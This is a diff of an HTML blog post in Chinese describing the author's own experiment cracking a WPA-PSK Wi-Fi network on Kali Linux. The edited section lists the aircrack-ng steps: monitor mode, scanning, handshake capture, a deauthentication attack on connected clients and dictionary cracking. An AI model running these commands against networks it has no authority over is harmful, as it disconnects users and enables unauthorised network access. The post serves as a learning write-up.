@@ -128,8 +128,13 @@
 <meta property="og:image" content="http://orleven.orleven.com/images/wifi-burst/wifi-base-1.png">
 <meta property="og:image" content="http://orleven.orleven.com/images/wifi-burst/wifi-base-2.png">
 <meta property="og:image" content="http://orleven.orleven.com/images/wifi-burst/wifi-burst-1.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/wifi-burst/wifi-burst-2.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/wifi-burst/wifi-burst-3.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/wifi-burst/wifi-burst-4.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/wifi-burst/wifi-burst-5.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/wifi-burst/wifi-burst-6.png">
 <meta property="og:image" content="http://orleven.orleven.com/images/wifi-burst/wifi-burst-7.png">
-<meta property="og:updated_time" content="2018-04-01T16:06:52.189Z">
+<meta property="og:updated_time" content="2018-04-01T16:08:34.727Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="无线攻击——WIFI">
 <meta name="twitter:description" content="概述工作需要学习一点无线知识，索性就买了个USB的无线网卡，做了个实验，简单了解下wifi无线破解的知识。">
@@ -492,13 +497,45 @@
 <h2 id="安装驱动"><a href="#安装驱动" class="headerlink" title="安装驱动"></a>安装驱动</h2><ol>
 <li>安装内核源代码、内核头文件以及编译环境。 </li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">apt-get install linux-source                # 安装内核源代码</div><div class="line">apt-get install linux-headers-$(uname -r)   # 安装内核头文件</div><div class="line">apt-get install build-essential             # 安装编译环境</div><div class="line">``` </div><div class="line"></div><div class="line">2. 在虚拟机中安装网卡驱动。</div><div class="line"></div><div class="line">由于官网找不到这个型号网卡在Linux上的驱动，通过google找到了可用的驱动，选择其中一个下载并安装即可：</div><div class="line"></div><div class="line">*   [驱动一](https://github.com/ilnanny/TL-WN725N-TP-Link-Debian)</div><div class="line">*   [驱动二](https://l33ttutorials.wordpress.com/2014/02/18/configuring-the-tp-link-tl-wn725n-on-kali-linux-2/)</div><div class="line"></div><div class="line">3. 运行`airmon-ng`或者`iwconfig`，驱动安装成功：</div></pre></td></tr></table></figure>
-<p>root@kali:/# airmon-ng<br>PHY Interface   Driver      Chipset<br>phy1    wlan0       mt7601u     Ralink Technology, Corp. MT7601U<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">![wifi-burst-2](/images/wifi-burst/wifi-burst-2.png)</div><div class="line"></div><div class="line">## 破解过程</div><div class="line"></div><div class="line">1. 把usb网卡插入虚拟机，并开启网卡到监听模式，命令如下：</div></pre></td></tr></table></figure></p>
-<p>airmon-ng start wlan0 (wlan0为无线网卡名称)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">![wifi-burst-3](/images/wifi-burst/wifi-burst-3.png)</div><div class="line"></div><div class="line">2. 抓包查看所在区域无线网的状态，选择需破解的目标网络，命令如下：</div></pre></td></tr></table></figure></p>
-<p>airodump-ng wlan0mon  ( wlan0mon 为无线网卡名称)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">![wifi-burst-4](/images/wifi-burst/wifi-burst-4.png)</div><div class="line"></div><div class="line">3. 抓取目标网络的握手包，命令如下：</div></pre></td></tr></table></figure></p>
-<p>airodump-ng -c 1 -–bssid F0:B4:29:65:06:1B  - w /root/Desktop/ wlan0mon<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">![wifi-burst-5](/images/wifi-burst/wifi-burst-5.png)</div><div class="line"></div><div class="line">4. 重新打开一个terminal窗口，使用DEAUTH攻击使已经连接的客户端断开并重新连接，以产生握手包。（注意：抓握手包破解必须有合法的客户端才行）命令如下：</div></pre></td></tr></table></figure></p>
-<h1 id="参数解释：-0-deauth攻击-10：进行10次攻击-a：AP的MAC地址-c：已连接该AP的客户端MAC地址"><a href="#参数解释：-0-deauth攻击-10：进行10次攻击-a：AP的MAC地址-c：已连接该AP的客户端MAC地址" class="headerlink" title="参数解释：- 0 deauth攻击 10：进行10次攻击 -a：AP的MAC地址 -c：已连接该AP的客户端MAC地址"></a>参数解释：- 0 deauth攻击 10：进行10次攻击 -a：AP的MAC地址 -c：已连接该AP的客户端MAC地址</h1><p>aireplay-ng -0 10 -a F0:B4:29:65:06:1B -c D8:63:75:BE:7B:F7 wlan0mon （多试几次）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">当获取到握手包时会出现红框内的信息：</div><div class="line"></div><div class="line">![wifi-burst-6](/images/wifi-burst/wifi-burst-6.png)</div><div class="line"></div><div class="line">5. 通过四次握手包和字典破解密码</div></pre></td></tr></table></figure></p>
-<h1 id="a2-WPA的方法破解握手包-w：字典路径-02-cap：-第四步中抓取的握手包文件名"><a href="#a2-WPA的方法破解握手包-w：字典路径-02-cap：-第四步中抓取的握手包文件名" class="headerlink" title="-a2 WPA的方法破解握手包 -w：字典路径 -02.cap： 第四步中抓取的握手包文件名"></a>-a2 WPA的方法破解握手包 -w：字典路径 -02.cap： 第四步中抓取的握手包文件名</h1><p>aircrack-ng -a2 -b  F0:B4:29:65:06:1B -w /root/Desktop/6000_password.txt /root/Desktop/-02.cap<br>```</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">apt-get install linux-source                # 安装内核源代码</div><div class="line">apt-get install linux-headers-$(uname -r)   # 安装内核头文件</div><div class="line">apt-get install build-essential             # 安装编译环境</div></pre></td></tr></table></figure>
+<ol>
+<li>在虚拟机中安装网卡驱动。</li>
+</ol>
+<p>由于官网找不到这个型号网卡在Linux上的驱动，通过google找到了可用的驱动，选择其中一个下载并安装即可：</p>
+<ul>
+<li><a href="https://github.com/ilnanny/TL-WN725N-TP-Link-Debian" target="_blank" rel="noopener">驱动一</a></li>
+<li><a href="https://l33ttutorials.wordpress.com/2014/02/18/configuring-the-tp-link-tl-wn725n-on-kali-linux-2/" target="_blank" rel="noopener">驱动二</a></li>
+</ul>
+<ol>
+<li>运行<code>airmon-ng</code>或者<code>iwconfig</code>，驱动安装成功：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">root@kali:/# airmon-ng </div><div class="line">PHY Interface   Driver      Chipset</div><div class="line">phy1    wlan0       mt7601u     Ralink Technology, Corp. MT7601U</div></pre></td></tr></table></figure>
+<p><img src="/images/wifi-burst/wifi-burst-2.png" alt="wifi-burst-2"></p>
+<h2 id="破解过程"><a href="#破解过程" class="headerlink" title="破解过程"></a>破解过程</h2><ol>
+<li>把usb网卡插入虚拟机，并开启网卡到监听模式，命令如下： </li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">airmon-ng start wlan0 (wlan0为无线网卡名称)</div></pre></td></tr></table></figure>
+<p><img src="/images/wifi-burst/wifi-burst-3.png" alt="wifi-burst-3"></p>
+<ol>
+<li>抓包查看所在区域无线网的状态，选择需破解的目标网络，命令如下： </li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">airodump-ng wlan0mon  ( wlan0mon 为无线网卡名称)</div></pre></td></tr></table></figure>
+<p><img src="/images/wifi-burst/wifi-burst-4.png" alt="wifi-burst-4"></p>
+<ol>
+<li>抓取目标网络的握手包，命令如下： </li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">airodump-ng -c 1 -–bssid F0:B4:29:65:06:1B  - w /root/Desktop/ wlan0mon</div></pre></td></tr></table></figure>
+<p><img src="/images/wifi-burst/wifi-burst-5.png" alt="wifi-burst-5"></p>
+<ol>
+<li>重新打开一个terminal窗口，使用DEAUTH攻击使已经连接的客户端断开并重新连接，以产生握手包。（注意：抓握手包破解必须有合法的客户端才行）命令如下： </li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># 参数解释：- 0 deauth攻击 10：进行10次攻击 -a：AP的MAC地址 -c：已连接该AP的客户端MAC地址</div><div class="line">aireplay-ng -0 10 -a F0:B4:29:65:06:1B -c D8:63:75:BE:7B:F7 wlan0mon （多试几次）</div></pre></td></tr></table></figure>
+<p>当获取到握手包时会出现红框内的信息：</p>
+<p><img src="/images/wifi-burst/wifi-burst-6.png" alt="wifi-burst-6"></p>
+<ol>
+<li>通过四次握手包和字典破解密码</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># -a2 WPA的方法破解握手包 -w：字典路径 -02.cap： 第四步中抓取的握手包文件名 </div><div class="line">aircrack-ng -a2 -b  F0:B4:29:65:06:1B -w /root/Desktop/6000_password.txt /root/Desktop/-02.cap</div></pre></td></tr></table></figure>
 <p><img src="/images/wifi-burst/wifi-burst-7.png" alt="wifi-burst-7"></p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>编译Linux驱动还很烦人的，主要时间还是浪费在了驱动上，破解操作比较简单，基本安装参考文章来的。</p>
 <p>参考文章： <a href="https://blog.csdn.net/swjtu100/article/details/50720208" target="_blank" rel="noopener">WPA-PSK无线网络破解原理与过程</a></p>
@@ -698,7 +735,7 @@
               
 
               
-                <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#概述"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#基础知识"><span class="nav-number">2.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEP-Wired-Equivalent-Privacy有线对等保密"><span class="nav-number">2.1.</span> <span class="nav-text">WEP(Wired Equivalent Privacy有线对等保密)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WPA"><span class="nav-number">2.2.</span> <span class="nav-text">WPA</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WPA-PSK-的四次握手过程"><span class="nav-number">2.2.1.</span> <span class="nav-text">WPA-PSK 的四次握手过程</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#破解"><span class="nav-number">3.</span> <span class="nav-text">破解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WPA—PSK破解原理"><span class="nav-number">3.1.</span> <span class="nav-text">WPA—PSK破解原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境"><span class="nav-number">3.2.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安装驱动"><span class="nav-number">3.3.</span> <span class="nav-text">安装驱动</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参数解释：-0-deauth攻击-10：进行10次攻击-a：AP的MAC地址-c：已连接该AP的客户端MAC地址"><span class="nav-number">4.</span> <span class="nav-text">参数解释：- 0 deauth攻击 10：进行10次攻击 -a：AP的MAC地址 -c：已连接该AP的客户端MAC地址</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#a2-WPA的方法破解握手包-w：字典路径-02-cap：-第四步中抓取的握手包文件名"><span class="nav-number">5.</span> <span class="nav-text">-a2 WPA的方法破解握手包 -w：字典路径 -02.cap： 第四步中抓取的握手包文件名</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">6.</span> <span class="nav-text">总结</span></a></li></ol></div>
+                <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#概述"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#基础知识"><span class="nav-number">2.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEP-Wired-Equivalent-Privacy有线对等保密"><span class="nav-number">2.1.</span> <span class="nav-text">WEP(Wired Equivalent Privacy有线对等保密)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WPA"><span class="nav-number">2.2.</span> <span class="nav-text">WPA</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WPA-PSK-的四次握手过程"><span class="nav-number">2.2.1.</span> <span class="nav-text">WPA-PSK 的四次握手过程</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#破解"><span class="nav-number">3.</span> <span class="nav-text">破解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WPA—PSK破解原理"><span class="nav-number">3.1.</span> <span class="nav-text">WPA—PSK破解原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境"><span class="nav-number">3.2.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安装驱动"><span class="nav-number">3.3.</span> <span class="nav-text">安装驱动</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#破解过程"><span class="nav-number">3.4.</span> <span class="nav-text">破解过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
               
 
             </div>
